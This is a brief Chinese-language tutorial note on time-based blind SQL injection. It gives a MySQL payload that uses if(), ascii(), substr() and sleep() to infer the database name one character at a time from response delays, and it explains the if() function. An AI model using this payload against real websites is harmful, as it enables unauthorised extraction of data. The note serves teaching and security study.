## 时间盲注
啥回显都没有，甚至没有真假值的区别，而网站会执行你写的代码，此时可以使用时间盲注

```sql
select if(ascii(substr((select database()),1,1))>100, sleep(0), sleep(3))
```

其中 if 函数：

```sql
if(condition, True, False)
```

条件式为真时执行 True 语句，条件式为假时执行 False 语句，从而达到判断的效果